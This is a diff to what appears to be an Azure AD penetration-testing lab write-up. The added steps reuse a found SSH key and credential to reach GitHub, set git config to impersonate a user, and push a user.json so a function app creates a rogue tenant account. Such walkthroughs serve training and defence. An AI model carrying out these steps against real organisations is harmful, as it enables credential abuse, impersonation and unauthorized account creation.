@@ -1116,6 +1116,7 @@ We can use Azure Storage Explore to navigate to these containers for download: `
 
 We get what looks like an SSH Key in the form of ```id_rsa```
 
+
 We can copy that directly into our users ```.ssh``` folder and use the key (run as admin):
 ```
 mkdir C:\Users\studentuser213\.ssh
@@ -1129,6 +1130,35 @@ ssh -T git@github.com
 
 When prompted use the creds we found earlier (cred re-use/stuffing): ```sL3B9zvf6@wCar8dYWqm7e```
 
+Next, clone the CreateUsers GitHub repository! We know that jenniferazuread have the rights to modify the CreateUsers repo by looking at the commit history! 
+```
+C:\AzAD\Tools>git clone git@github.com:DefCorp/CreateUsers.git
+```
+
+The README of this repo mentions that it can be used for creating users in DefCorphq tenant for accessing Enterprise Applications. There is an example 'user.json' file in the Example directory. The README also points to a function app URL to create the users - ```https://createusersapp.azurewebsites.net/api/CreateUsersApp?id=```
+Let’s use that file! Go to the CreateUsers directory, create a directory for your student ID and copy the user.json file to your studentx directory:
+
+user.json==
+```
+{ "accountEnabled": true, "displayName": "studentx", "mailNickname": "studentx", "userPrincipalName": "studentx@defcorphq.onmicrosoft.com", "passwordProfile" : { "forceChangePasswordNextSignIn": false, "password": "StudxPassword@123" } }
+```
+
+
 
 ```
+cd CreateUsers
+mkdir student213 
+copy C:\AzAD\Tools\CreateUsers\Example\user.json C:\AzAD\Tools\CreateUsers\student213\user.json
+cd student213
+```
+
+Finally, commit the changes to the CreateUsers repo using the following commands:
+```
+git add .
+git config --global user.email "81172144+jenniferazad@users.noreply.github.com" 
+git config --global user.name "jenniferazad"
+C:\AzAD\Tools\CreateUsers\studentx>git push
+```
+
+Now browse to the function app and it should create a user for us: ```https://createusersapp.azurewebsites.net/api/CreateUsersApp?id=213```
 
